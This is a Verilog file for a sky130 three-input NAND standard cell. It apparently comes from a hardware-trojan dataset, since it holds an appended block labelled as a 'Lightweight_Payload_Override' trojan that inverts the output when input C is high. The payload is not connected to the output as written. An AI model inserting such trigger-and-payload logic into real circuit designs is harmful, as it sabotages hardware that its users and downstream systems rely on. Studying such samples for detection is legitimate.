module sky130_fd_sc_lp__nand3 (
    input A,
    input B,
    input C,
    input VPWR,
    input VGND,
    input VPB,
    input VNB,
    output Y
);

  assign Y = ~(A & B & C);



// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg htrojan_pay;
always @(*) begin
    htrojan_trig = (C == 1'b1);
    htrojan_pay = htrojan_trig ? (Y ^ 1'b1) : Y;
end
// HT_END
endmodule
